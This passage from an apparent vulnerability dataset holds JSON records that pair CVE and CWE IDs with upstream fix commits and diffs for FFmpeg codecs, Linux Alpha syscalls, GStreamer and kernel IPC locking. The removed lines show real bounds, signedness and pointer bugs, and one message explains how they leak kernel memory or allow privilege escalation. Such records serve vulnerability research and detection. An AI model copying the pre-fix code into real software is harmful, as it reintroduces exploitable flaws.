UPSCALE( to->x );\n@@ -1104,7 +1099,7 @@\n \n     Draw:\n       {\n-        TPos  to_x, to_y, mid_x, mid_y;\n+        TPos  to_x, to_y;\n \n \n         to_x  = arc[0].x;\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-0853","CWE_ID":"189","category":"security","commit_id":"be818df547c3b0ae4fadb50fd210139a8636706a","commit_message":"From be818df547c3b0ae4fadb50fd210139a8636706a Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Mon, 12 Nov 2012 14:42:45 +0100\nSubject: [PATCH] wavpack: fix out of array access\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/wavpack.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/wavpack.c b\/libavcodec\/wavpack.c\nindex 69637fee51..2935abfa8b 100644\n--- a\/libavcodec\/wavpack.c\n+++ b\/libavcodec\/wavpack.c\n@@ -1208,11 +1208,12 @@ static int wavpack_decode_frame(AVCodecContext *avctx, void *data,\n     }\n \n     \/* get output buffer *\/\n-    s->frame.nb_samples = s->samples;\n+    s->frame.nb_samples = s->samples + 1;\n     if ((ret = avctx->get_buffer(avctx, &s->frame)) < 0) {\n         av_log(avctx, AV_LOG_ERROR, \"get_buffer() failed\\n\");\n         return ret;\n     }\n+    s->frame.nb_samples = s->samples;\n \n     while (buf_size > 0) {\n         if (!s->multichannel) {\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-3973","CWE_ID":"189","category":"security","commit_id":"bd968d260aef322fb32e254a3de0d2036c57bd56","commit_message":"From bd968d260aef322fb32e254a3de0d2036c57bd56 Mon Sep 17 00:00:00 2001\nFrom: Mans Rullgard <mans@mansr.com>\nDate: Wed, 10 Aug 2011 18:52:11 +0100\nSubject: [PATCH] cavs: fix some crashes with invalid bitstreams\n\nThis removes all valgrind-reported invalid writes with one\nspecific test file.\n\nFixes http:\/\/www.ocert.org\/advisories\/ocert-2011-002.html\n\nSigned-off-by: Mans Rullgard <mans@mansr.com>\n(cherry picked from commit 4a71da0f3ab7f5542decd11c81994f849d5b2c78)\n---\n libavcodec\/cavsdec.c | 11 ++++++++---\n 1 file changed, 8 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/libavcodec\/cavsdec.c b\/libavcodec\/cavsdec.c\nindex a9e4d37c2a..35c37d0768 100644\n--- a\/libavcodec\/cavsdec.c\n+++ b\/libavcodec\/cavsdec.c\n@@ -130,12 +130,14 @@ static int decode_residual_block(AVSContext *h, GetBitContext *gb,\n                 r++;\n             mask = -(level_code & 1);\n             level = (level^mask) - mask;\n-        } else {\n+        } else if (level_code >= 0) {\n             level = r->rltab[level_code][0];\n             if(!level) \/\/end of block signal\n                 break;\n             run   = r->rltab[level_code][1];\n             r += r->rltab[level_code][2];\n+        } else {\n+            break;\n         }\n         level_buf[i] = level;\n         run_buf[i] = run;\n@@ -189,7 +191,8 @@ static inline int decode_residual_inter(AVSContext *h) {\n \n static int decode_mb_i(AVSContext *h, int cbp_code) {\n     GetBitContext *gb = &h->s.gb;\n-    int block, pred_mode_uv;\n+    unsigned pred_mode_uv;\n+    int block;\n     uint8_t top[18];\n     uint8_t *left = NULL;\n     uint8_t *d;\n@@ -445,6 +448,8 @@ static inline int check_for_slice(AVSContext *h) {\n     if((show_bits_long(gb,24+align) & 0xFFFFFF) == 0x000001) {\n         skip_bits_long(gb,24+align);\n         h->stc = get_bits(gb,8);\n+        if (h->stc >= h->mb_height)\n+            return 0;\n         decode_slice_header(h,gb);\n         return 1;\n     }\n@@ -659,7 +664,7 @@ static int cavs_decode_frame(AVCodecContext * avctx,void *data, int *data_size,\n     buf_end = buf + buf_size;\n     for(;;) {\n         buf_ptr = ff_find_start_code(buf_ptr,buf_end, &stc);\n-        if(stc & 0xFFFFFE00)\n+        if((stc & 0xFFFFFE00) || buf_ptr == buf_end)\n             return FFMAX(0, buf_ptr - buf - s->parse_context.last_index);\n         input_size = (buf_end - buf_ptr)*8;\n         switch(stc) {\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-2208","CWE_ID":"189","category":"security","commit_id":"21c5977a836e399fc710ff2c5367845ed5c2527f","commit_message":"From 21c5977a836e399fc710ff2c5367845ed5c2527f Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <drosenberg@vsecurity.com>\nDate: Wed, 15 Jun 2011 15:09:01 -0700\nSubject: [PATCH] alpha: fix several security issues\n\nFix several security issues in Alpha-specific syscalls.  Untested, but\nmostly trivial.\n\n1. Signedness issue in osf_getdomainname allows copying out-of-bounds\nkernel memory to userland.\n\n2. Signedness issue in osf_sysinfo allows copying large amounts of\nkernel memory to userland.\n\n3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy\nsize, allowing copying large amounts of kernel memory to userland.\n\n4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows\nprivilege escalation via writing return value of sys_wait4 to kernel\nmemory.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: Richard Henderson <rth@twiddle.net>\nCc: Ivan Kokshaysky <ink@jurassic.park.msu.ru>\nCc: Matt Turner <mattst88@gmail.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n arch\/alpha\/kernel\/osf_sys.c | 11 +++++++----\n 1 file changed, 7 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/arch\/alpha\/kernel\/osf_sys.c b\/arch\/alpha\/kernel\/osf_sys.c\nindex 376f221307919..326f0a2d56e52 100644\n--- a\/arch\/alpha\/kernel\/osf_sys.c\n+++ b\/arch\/alpha\/kernel\/osf_sys.c\n@@ -409,7 +409,7 @@ SYSCALL_DEFINE2(osf_getdomainname, char __user *, name, int, namelen)\n \t\treturn -EFAULT;\n \n \tlen = namelen;\n-\tif (namelen > 32)\n+\tif (len > 32)\n \t\tlen = 32;\n \n \tdown_read(&uts_sem);\n@@ -594,7 +594,7 @@ SYSCALL_DEFINE3(osf_sysinfo, int, command, char __user *, buf, long, count)\n \tdown_read(&uts_sem);\n \tres = sysinfo_table[offset];\n \tlen = strlen(res)+1;\n-\tif (len > count)\n+\tif ((unsigned long)len > (unsigned long)count)\n \t\tlen = count;\n \tif (copy_to_user(buf, res, len))\n \t\terr = -EFAULT;\n@@ -649,7 +649,7 @@ SYSCALL_DEFINE5(osf_getsysinfo, unsigned long, op, void __user *, buffer,\n \t\treturn 1;\n \n \tcase GSI_GET_HWRPB:\n-\t\tif (nbytes < sizeof(*hwrpb))\n+\t\tif (nbytes > sizeof(*hwrpb))\n \t\t\treturn -EINVAL;\n \t\tif (copy_to_user(buffer, hwrpb, nbytes) != 0)\n \t\t\treturn -EFAULT;\n@@ -1008,6 +1008,7 @@ SYSCALL_DEFINE4(osf_wait4, pid_t, pid, int __user *, ustatus, int, options,\n {\n \tstruct rusage r;\n \tlong ret, err;\n+\tunsigned int status = 0;\n \tmm_segment_t old_fs;\n \n \tif (!ur)\n@@ -1016,13 +1017,15 @@ SYSCALL_DEFINE4(osf_wait4, pid_t, pid, int __user *, ustatus, int, options,\n \told_fs = get_fs();\n \t\t\n \tset_fs (KERNEL_DS);\n-\tret = sys_wait4(pid, ustatus, options, (struct rusage __user *) &r);\n+\tret = sys_wait4(pid, (unsigned int __user *) &status, options,\n+\t\t\t(struct rusage __user *) &r);\n \tset_fs (old_fs);\n \n \tif (!access_ok(VERIFY_WRITE, ur, sizeof(*ur)))\n \t\treturn -EFAULT;\n \n \terr = 0;\n+\terr |= put_user(status, ustatus);\n \terr |= __put_user(r.ru_utime.tv_sec, &ur->ru_utime.tv_sec);\n \terr |= __put_user(r.ru_utime.tv_usec, &ur->ru_utime.tv_usec);\n \terr |= __put_user(r.ru_stime.tv_sec, &ur->ru_stime.tv_sec);\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-9604","CWE_ID":"189","category":"security","commit_id":"3881606240953b9275a247a1c98a567f3c44890f","commit_message":"From 3881606240953b9275a247a1c98a567f3c44890f Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Tue, 16 Dec 2014 20:45:31 +0100\nSubject: [PATCH] avcodec\/utvideodec: Fix handling of slice_height=0\n\nFixes out of array accesses\nFixes: asan_heap-oob_25bcd7e_3783_cov_3553517262_utvideo_rgba_median.avi\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/utvideodec.c | 4 ++++\n 1 file changed, 4 insertions(+)\n\n","diff_code":"diff --git a\/libavcodec\/utvideodec.c b\/libavcodec\/utvideodec.c\nindex b565c1076c..3a3c46e0bc 100644\n--- a\/libavcodec\/utvideodec.c\n+++ b\/libavcodec\/utvideodec.c\n@@ -215,6 +215,8 @@ static void restore_median(uint8_t *src, int step, int stride,\n         slice_height = ((((slice + 1) * height) \/ slices) & cmask) -\n                        slice_start;\n \n+        if (!slice_height)\n+            continue;\n         bsrc = src + slice_start * stride;\n \n         \/\/ first line - left neighbour prediction\n@@ -270,6 +272,8 @@ static void restore_median_il(uint8_t *src, int step, int stride,\n         slice_height   = ((((slice + 1) * height) \/ slices) & cmask) -\n                          slice_start;\n         slice_height >>= 1;\n+        if (!slice_height)\n+            continue;\n \n         bsrc = src + slice_start * stride;\n \n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-0844","CWE_ID":"189","category":"security","commit_id":"85a14dbd5dca34320f58b1ba11dd6dd0df4fb3be","commit_message":"From 85a14dbd5dca34320f58b1ba11dd6dd0df4fb3be Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Wed, 12 Dec 2012 17:14:32 +0100\nSubject: [PATCH] adpcm: fix off by 1 error and out of array access in DK4\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n(cherry picked from commit f18c873ab5ee3c78d00fdcc2582b39c133faecb4)\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/adpcm.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/adpcm.c b\/libavcodec\/adpcm.c\nindex c779f8b572..683a231f26 100644\n--- a\/libavcodec\/adpcm.c\n+++ b\/libavcodec\/adpcm.c\n@@ -755,7 +755,7 @@ static int adpcm_decode_frame(AVCodecContext *avctx, void *data,\n                 return AVERROR_INVALIDDATA;\n             }\n         }\n-        for (n = nb_samples >> (1 - st); n > 0; n--) {\n+        for (n = (nb_samples - 1) >> (1 - st); n > 0; n--) {\n             int v = bytestream2_get_byteu(&gb);\n             *samples++ = adpcm_ima_expand_nibble(&c->status[0 ], v >> 4  , 3);\n             *samples++ = adpcm_ima_expand_nibble(&c->status[st], v & 0x0F, 3);\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2009-0586","CWE_ID":"189","category":"security","commit_id":"566583e87147f774e7fc4c78b5f7e61d427e40a9","commit_message":"From 566583e87147f774e7fc4c78b5f7e61d427e40a9 Mon Sep 17 00:00:00 2001\nFrom: Jan Schmidt <thaytan@noraisin.net>\nDate: Tue, 24 Feb 2009 15:58:42 +0000\nSubject: vorbistag: Protect memory allocation calculation from overflow.\n\nPatch by: Tomas Hoger <thoger@redhat.com> Fixes CVE-2009-0586\n---\n gst-libs\/gst\/tag\/gstvorbistag.c | 33 ++++++++++++++-------------------\n 1 file changed, 14 insertions(+), 19 deletions(-)\n\n","diff_code":"diff --git a\/gst-libs\/gst\/tag\/gstvorbistag.c b\/gst-libs\/gst\/tag\/gstvorbistag.c\nindex 0999368..9401e61 100644\n--- a\/gst-libs\/gst\/tag\/gstvorbistag.c\n+++ b\/gst-libs\/gst\/tag\/gstvorbistag.c\n@@ -305,30 +305,32 @@ gst_vorbis_tag_add (GstTagList * list, const gchar * tag, const gchar * value)\n }\n \n static void\n-gst_vorbis_tag_add_coverart (GstTagList * tags, const gchar * img_data_base64,\n+gst_vorbis_tag_add_coverart (GstTagList * tags, gchar * img_data_base64,\n     gint base64_len)\n {\n   GstBuffer *img;\n-  guchar *img_data;\n   gsize img_len;\n+  guchar *out;\n   guint save = 0;\n   gint state = 0;\n \n   if (base64_len < 2)\n     goto not_enough_data;\n \n-  img_data = g_try_malloc0 (base64_len * 3 \/ 4);\n-\n-  if (img_data == NULL)\n-    goto alloc_failed;\n-\n-  img_len = g_base64_decode_step (img_data_base64, base64_len, img_data,\n-      &state, &save);\n+  \/* img_data_base64 points to a temporary copy of the base64 encoded data, so\n+   * it's safe to do inpace decoding here\n+   * TODO: glib 2.20 and later provides g_base64_decode_inplace, so change this\n+   * to use glib's API instead once it's in wider use:\n+   *  http:\/\/bugzilla.gnome.org\/show_bug.cgi?id=564728\n+   *  http:\/\/svn.gnome.org\/viewvc\/glib?view=revision&revision=7807 *\/\n+  out = (guchar *) img_data_base64;\n+  img_len = g_base64_decode_step (img_data_base64, base64_len,\n+      out, &state, &save);\n \n   if (img_len == 0)\n     goto decode_failed;\n \n-  img = gst_tag_image_data_to_image_buffer (img_data, img_len,\n+  img = gst_tag_image_data_to_image_buffer (out, img_len,\n       GST_TAG_IMAGE_TYPE_NONE);\n \n   if (img == NULL)\n@@ -338,7 +340,6 @@ gst_vorbis_tag_add_coverart (GstTagList * tags, const gchar * img_data_base64,\n       GST_TAG_PREVIEW_IMAGE, img, NULL);\n \n   gst_buffer_unref (img);\n-  g_free (img_data);\n   return;\n \n \/* ERRORS *\/\n@@ -347,21 +348,14 @@ not_enough_data:\n     GST_WARNING (\"COVERART tag with too little base64-encoded data\");\n     return;\n   }\n-alloc_failed:\n-  {\n-    GST_WARNING (\"Couldn't allocate enough memory to decode COVERART tag\");\n-    return;\n-  }\n decode_failed:\n   {\n-    GST_WARNING (\"Couldn't decode bas64 image data from COVERART tag\");\n-    g_free (img_data);\n+    GST_WARNING (\"Couldn't decode base64 image data from COVERART tag\");\n     return;\n   }\n convert_failed:\n   {\n     GST_WARNING (\"Couldn't extract image or image type from COVERART tag\");\n-    g_free (img_data);\n     return;\n   }\n }\n@@ -457,6 +451,7 @@ error:\n   return NULL;\n #undef ADVANCE\n }\n+\n typedef struct\n {\n   guint count;\n-- \ncgit v1.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-4483","CWE_ID":"189","category":"security","commit_id":"6062a8dc0517bce23e3c2f7d2fea5e22411269a3","commit_message":"From 6062a8dc0517bce23e3c2f7d2fea5e22411269a3 Mon Sep 17 00:00:00 2001\nFrom: Rik van Riel <riel@surriel.com>\nDate: Tue, 30 Apr 2013 19:15:44 -0700\nSubject: ipc,sem: fine grained locking for semtimedop\n\nIntroduce finer grained locking for semtimedop, to handle the common case\nof a program wanting to manipulate one semaphore from an array with\nmultiple semaphores.\n\nIf the call is a semop manipulating just one semaphore in an array with\nmultiple semaphores, only take the lock for that semaphore itself.\n\nIf the call needs to manipulate multiple semaphores, or another caller is\nin a transaction that manipulates multiple semaphores, the sem_array lock\nis taken, as well as all the locks for the individual semaphores.\n\nOn a 24 CPU system, performance numbers with the semop-multi\ntest with N threads and N semaphores, look like this:\n\n\tvanilla\t\tDavidlohr's\tDavidlohr's +\tDavidlohr's +\nthreads\t\t\tpatches\t\trwlock patches\tv3 patches\n10\t610652\t\t726325\t\t1783589\t\t2142206\n20\t341570\t\t365699\t\t1520453\t\t1977878\n30\t288102\t\t307037\t\t1498167\t\t2037995\n40\t290714\t\t305955\t\t1612665\t\t2256484\n50\t288620\t\t312890\t\t1733453\t\t2650292\n60\t289987\t\t306043\t\t1649360\t\t2388008\n70\t291298\t\t306347\t\t1723167\t\t2717486\n80\t290948\t\t305662\t\t1729545\t\t2763582\n90\t290996\t\t306680\t\t1736021\t\t2757524\n100\t292243\t\t306700\t\t1773700\t\t3059159\n\n[davidlohr.bueso@hp.com: do not call sem_lock when bogus sma]\n[davidlohr.bueso@hp.com: make refcounter atomic]\nSigned-off-by: Rik van Riel <riel@redhat.com>\nSuggested-by: Linus Torvalds <torvalds@linux-foundation.org>\nAcked-by: Davidlohr Bueso <davidlohr.bueso@hp.com>\nCc: Chegu Vinod <chegu_vinod@hp.com>\nCc: Jason Low <jason.low2@hp.com>\nReviewed-by: Michel Lespinasse <walken@google.com>\nCc: Peter Hurley <peter@hurleysoftware.com>\nCc: Stanislav Kinsbursky <skinsbursky@parallels.com>\nTested-by: Emmanuel Benisty <benisty.e@gmail.com>\nTested-by: Sedat Dilek <sedat.dilek@gmail.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n ipc\/msg.c  |   7 +-\n ipc\/sem.c  | 271 ++++++++++++++++++++++++++++++++++++++-----------------------\n ipc\/util.c |  48 +++++------\n ipc\/util.h |   2 +-\n 4 files changed, 203 insertions(+), 125 deletions(-)\n\n","diff_code":"diff --git a\/ipc\/msg.c b\/ipc\/msg.c\nindex a80aaf463d9c..09a1f41e6595 100644\n--- a\/ipc\/msg.c\n+++ b\/ipc\/msg.c\n@@ -687,7 +687,12 @@ long do_msgsnd(int msqid, long mtype, void __user *mtext,\n \t\t\tgoto out_unlock_free;\n \t\t}\n \t\tss_add(msq, &s);\n-\t\tipc_rcu_getref(msq);\n+\n+\t\tif (!ipc_rcu_getref(msq)) {\n+\t\t\terr = -EIDRM;\n+\t\t\tgoto out_unlock_free;\n+\t\t}\n+\n \t\tmsg_unlock(msq);\n \t\tschedule();\n \ndiff --git a\/ipc\/sem.c b\/ipc\/sem.c\nindex f68b61749a85..e78ee3186d1f 100644\n--- a\/ipc\/sem.c\n+++ b\/ipc\/sem.c\n@@ -94,6 +94,7 @@\n struct sem {\n \tint\tsemval;\t\t\/* current value *\/\n \tint\tsempid;\t\t\/* pid of last operation *\/\n+\tspinlock_t\tlock;\t\/* spinlock for fine-grained semtimedop *\/\n \tstruct list_head sem_pending; \/* pending single-sop operations *\/\n };\n \n@@ -137,7 +138,6 @@ struct sem_undo_list {\n \n #define sem_ids(ns)\t((ns)->ids[IPC_SEM_IDS])\n \n-#define sem_unlock(sma)\t\tipc_unlock(&(sma)->sem_perm)\n #define sem_checkid(sma, semid)\tipc_checkid(&sma->sem_perm, semid)\n \n static int newary(struct ipc_namespace *, struct ipc_params *);\n@@ -189,11 +189,90 @@ void __init sem_init (void)\n \t\t\t\tIPC_SEM_IDS, sysvipc_sem_proc_show);\n }\n \n+\/*\n+ * If the request contains only one semaphore operation, and there are\n+ * no complex transactions pending, lock only the semaphore involved.\n+ * Otherwise, lock the entire semaphore array, since we either have\n+ * multiple semaphores in our own semops, or we need to look at\n+ * semaphores from other pending complex operations.\n+ *\n+ * Carefully guard against sma->complex_count changing between zero\n+ * and non-zero while we are spinning for the lock. The value of\n+ * sma->complex_count cannot change while we are holding the lock,\n+ * so sem_unlock should be fine.\n+ *\n+ * The global lock path checks that all the local locks have been released,\n+ * checking each local lock once. This means that the local lock paths\n+ * cannot start their critical sections while the global lock is held.\n+ *\/\n+static inline int sem_lock(struct sem_array *sma, struct sembuf *sops,\n+\t\t\t      int nsops)\n+{\n+\tint locknum;\n+ again:\n+\tif (nsops == 1 && !sma->complex_count) {\n+\t\tstruct sem *sem = sma->sem_base + sops->sem_num;\n+\n+\t\t\/* Lock just the semaphore we are interested in. *\/\n+\t\tspin_lock(&sem->lock);\n+\n+\t\t\/*\n+\t\t * If sma->complex_count was set while we were spinning,\n+\t\t * we may need to look at things we did not lock here.\n+\t\t *\/\n+\t\tif (unlikely(sma->complex_count)) {\n+\t\t\tspin_unlock(&sem->lock);\n+\t\t\tgoto lock_array;\n+\t\t}\n+\n+\t\t\/*\n+\t\t * Another process is holding the global lock on the\n+\t\t * sem_array; we cannot enter our critical section,\n+\t\t * but have to wait for the global lock to be released.\n+\t\t *\/\n+\t\tif (unlikely(spin_is_locked(&sma->sem_perm.lock))) {\n+\t\t\tspin_unlock(&sem->lock);\n+\t\t\tspin_unlock_wait(&sma->sem_perm.lock);\n+\t\t\tgoto again;\n+\t\t}\n+\n+\t\tlocknum = sops->sem_num;\n+\t} else {\n+\t\tint i;\n+\t\t\/*\n+\t\t * Lock the semaphore array, and wait for all of the\n+\t\t * individual semaphore locks to go away.  The code\n+\t\t * above ensures no new single-lock holders will enter\n+\t\t * their critical section while the array lock is held.\n+\t\t *\/\n+ lock_array:\n+\t\tspin_lock(&sma->sem_perm.lock);\n+\t\tfor (i = 0; i < sma->sem_nsems; i++) {\n+\t\t\tstruct sem *sem = sma->sem_base + i;\n+\t\t\tspin_unlock_wait(&sem->lock);\n+\t\t}\n+\t\tlocknum = -1;\n+\t}\n+\treturn locknum;\n+}\n+\n+static inline void sem_unlock(struct sem_array *sma, int locknum)\n+{\n+\tif (locknum == -1) {\n+\t\tspin_unlock(&sma->sem_perm.lock);\n+\t} else {\n+\t\tstruct sem *sem = sma->sem_base + locknum;\n+\t\tspin_unlock(&sem->lock);\n+\t}\n+\trcu_read_unlock();\n+}\n+\n \/*\n  * sem_lock_(check_) routines are called in the paths where the rw_mutex\n  * is not held.\n  *\/\n-static inline struct sem_array *sem_obtain_lock(struct ipc_namespace *ns, int id)\n+static inline struct sem_array *sem_obtain_lock(struct ipc_namespace *ns,\n+\t\t\tint id, struct sembuf *sops, int nsops, int *locknum)\n {\n \tstruct kern_ipc_perm *ipcp;\n \tstruct sem_array *sma;\n@@ -205,7 +284,8 @@ static inline struct sem_array *sem_obtain_lock(struct ipc_namespace *ns, int id\n \t\tgoto err;\n \t}\n \n-\tspin_lock(&ipcp->lock);\n+\tsma = container_of(ipcp, struct sem_array, sem_perm);\n+\t*locknum = sem_lock(sma, sops, nsops);\n \n \t\/* ipc_rmid() may have already freed the ID while sem_lock\n \t * was spinning: verify that the structure is still valid\n@@ -213,7 +293,7 @@ static inline struct sem_array *sem_obtain_lock(struct ipc_namespace *ns, int id\n \tif (!ipcp->deleted)\n \t\treturn container_of(ipcp, struct sem_array, sem_perm);\n \n-\tspin_unlock(&ipcp->lock);\n+\tsem_unlock(sma, *locknum);\n \tsma = ERR_PTR(-EINVAL);\n err:\n \trcu_read_unlock();\n@@ -230,17 +310,6 @@ static inline struct sem_array *sem_obtain_object(struct ipc_namespace *ns, int\n \treturn container_of(ipcp, struct sem_array, sem_perm);\n }\n \n-static inline struct sem_array *sem_lock_check(struct ipc_namespace *ns,\n-\t\t\t\t\t\tint id)\n-{\n-\tstruct kern_ipc_perm *ipcp = ipc_lock_check(&sem_ids(ns), id);\n-\n-\tif (IS_ERR(ipcp))\n-\t\treturn ERR_CAST(ipcp);\n-\n-\treturn container_of(ipcp, struct sem_array, sem_perm);\n-}\n-\n static inline struct sem_array *sem_obtain_object_check(struct ipc_namespace *ns,\n \t\t\t\t\t\t\tint id)\n {\n@@ -254,21 +323,21 @@ static inline struct sem_array *sem_obtain_object_check(struct ipc_namespace *ns\n \n static inline void sem_lock_and_putref(struct sem_array *sma)\n {\n-\tipc_lock_by_ptr(&sma->sem_perm);\n+\trcu_read_lock();\n+\tsem_lock(sma, NULL, -1);\n \tipc_rcu_putref(sma);\n }\n \n static inline void sem_getref_and_unlock(struct sem_array *sma)\n {\n-\tipc_rcu_getref(sma);\n-\tipc_unlock(&(sma)->sem_perm);\n+\tWARN_ON_ONCE(!ipc_rcu_getref(sma));\n+\tsem_unlock(sma, -1);\n }\n \n static inline void sem_putref(struct sem_array *sma)\n {\n-\tipc_lock_by_ptr(&sma->sem_perm);\n-\tipc_rcu_putref(sma);\n-\tipc_unlock(&(sma)->sem_perm);\n+\tsem_lock_and_putref(sma);\n+\tsem_unlock(sma, -1);\n }\n \n \/*\n@@ -276,9 +345,9 @@ static inline void sem_putref(struct sem_array *sma)\n  *\/\n static inline void sem_getref(struct sem_array *sma)\n {\n-\tspin_lock(&(sma)->sem_perm.lock);\n-\tipc_rcu_getref(sma);\n-\tipc_unlock(&(sma)->sem_perm);\n+\tsem_lock(sma, NULL, -1);\n+\tWARN_ON_ONCE(!ipc_rcu_getref(sma));\n+\tsem_unlock(sma, -1);\n }\n \n static inline void sem_rmid(struct ipc_namespace *ns, struct sem_array *s)\n@@ -371,15 +440,17 @@ static int newary(struct ipc_namespace *ns, struct ipc_params *params)\n \n \tsma->sem_base = (struct sem *) &sma[1];\n \n-\tfor (i = 0; i < nsems; i++)\n+\tfor (i = 0; i < nsems; i++) {\n \t\tINIT_LIST_HEAD(&sma->sem_base[i].sem_pending);\n+\t\tspin_lock_init(&sma->sem_base[i].lock);\n+\t}\n \n \tsma->complex_count = 0;\n \tINIT_LIST_HEAD(&sma->sem_pending);\n \tINIT_LIST_HEAD(&sma->list_id);\n \tsma->sem_nsems = nsems;\n \tsma->sem_ctime = get_seconds();\n-\tsem_unlock(sma);\n+\tsem_unlock(sma, -1);\n \n \treturn sma->sem_perm.id;\n }\n@@ -818,7 +889,7 @@ static void freeary(struct ipc_namespace *ns, struct kern_ipc_perm *ipcp)\n \n \t\/* Remove the semaphore set from the IDR *\/\n \tsem_rmid(ns, sma);\n-\tsem_unlock(sma);\n+\tsem_unlock(sma, -1);\n \n \twake_up_sem_queue_do(&tasks);\n \tns->used_sems -= sma->sem_nsems;\n@@ -947,7 +1018,6 @@ static int semctl_setval(struct ipc_namespace *ns, int semid, int semnum,\n \tstruct sem_array *sma;\n \tstruct sem* curr;\n \tint err;\n-\tint nsems;\n \tstruct list_head tasks;\n \tint val;\n #if defined(CONFIG_64BIT) && defined(__BIG_ENDIAN)\n@@ -958,31 +1028,39 @@ static int semctl_setval(struct ipc_namespace *ns, int semid, int semnum,\n \tval = arg;\n #endif\n \n-\tsma = sem_lock_check(ns, semid);\n-\tif (IS_ERR(sma))\n-\t\treturn PTR_ERR(sma);\n+\tif (val > SEMVMX || val < 0)\n+\t\treturn -ERANGE;\n \n \tINIT_LIST_HEAD(&tasks);\n-\tnsems = sma->sem_nsems;\n \n-\terr = -EACCES;\n-\tif (ipcperms(ns, &sma->sem_perm, S_IWUGO))\n-\t\tgoto out_unlock;\n+\trcu_read_lock();\n+\tsma = sem_obtain_object_check(ns, semid);\n+\tif (IS_ERR(sma)) {\n+\t\trcu_read_unlock();\n+\t\treturn PTR_ERR(sma);\n+\t}\n+\n+\tif (semnum < 0 || semnum >= sma->sem_nsems) {\n+\t\trcu_read_unlock();\n+\t\treturn -EINVAL;\n+\t}\n+\n+\n+\tif (ipcperms(ns, &sma->sem_perm, S_IWUGO)) {\n+\t\trcu_read_unlock();\n+\t\treturn -EACCES;\n+\t}\n \n \terr = security_sem_semctl(sma, SETVAL);\n-\tif (err)\n-\t\tgoto out_unlock;\n+\tif (err) {\n+\t\trcu_read_unlock();\n+\t\treturn -EACCES;\n+\t}\n \n-\terr = -EINVAL;\n-\tif(semnum < 0 || semnum >= nsems)\n-\t\tgoto out_unlock;\n+\tsem_lock(sma, NULL, -1);\n \n \tcurr = &sma->sem_base[semnum];\n \n-\terr = -ERANGE;\n-\tif (val > SEMVMX || val < 0)\n-\t\tgoto out_unlock;\n-\n \tassert_spin_locked(&sma->sem_perm.lock);\n \tlist_for_each_entry(un, &sma->list_id, list_id)\n \t\tun->semadj[semnum] = 0;\n@@ -992,11 +1070,9 @@ static int semctl_setval(struct ipc_namespace *ns, int semid, int semnum,\n \tsma->sem_ctime = get_seconds();\n \t\/* maybe some queued-up processes were waiting for this *\/\n \tdo_smart_update(sma, NULL, 0, 0, &tasks);\n-\terr = 0;\n-out_unlock:\n-\tsem_unlock(sma);\n+\tsem_unlock(sma, -1);\n \twake_up_sem_queue_do(&tasks);\n-\treturn err;\n+\treturn 0;\n }\n \n static int semctl_main(struct ipc_namespace *ns, int semid, int semnum,\n@@ -1051,16 +1127,16 @@ static int semctl_main(struct ipc_namespace *ns, int semid, int semnum,\n \n \t\t\tsem_lock_and_putref(sma);\n \t\t\tif (sma->sem_perm.deleted) {\n-\t\t\t\tsem_unlock(sma);\n+\t\t\t\tsem_unlock(sma, -1);\n \t\t\t\terr = -EIDRM;\n \t\t\t\tgoto out_free;\n \t\t\t}\n-\t\t}\n+\t\t} else\n+\t\t\tsem_lock(sma, NULL, -1);\n \n-\t\tspin_lock(&sma->sem_perm.lock);\n \t\tfor (i = 0; i < sma->sem_nsems; i++)\n \t\t\tsem_io[i] = sma->sem_base[i].semval;\n-\t\tsem_unlock(sma);\n+\t\tsem_unlock(sma, -1);\n \t\terr = 0;\n \t\tif(copy_to_user(array, sem_io, nsems*sizeof(ushort)))\n \t\t\terr = -EFAULT;\n@@ -1071,7 +1147,10 @@ static int semctl_main(struct ipc_namespace *ns, int semid, int semnum,\n \t\tint i;\n \t\tstruct sem_undo *un;\n \n-\t\tipc_rcu_getref(sma);\n+\t\tif (!ipc_rcu_getref(sma)) {\n+\t\t\trcu_read_unlock();\n+\t\t\treturn -EIDRM;\n+\t\t}\n \t\trcu_read_unlock();\n \n \t\tif(nsems > SEMMSL_FAST) {\n@@ -1097,7 +1176,7 @@ static int semctl_main(struct ipc_namespace *ns, int semid, int semnum,\n \t\t}\n \t\tsem_lock_and_putref(sma);\n \t\tif (sma->sem_perm.deleted) {\n-\t\t\tsem_unlock(sma);\n+\t\t\tsem_unlock(sma, -1);\n 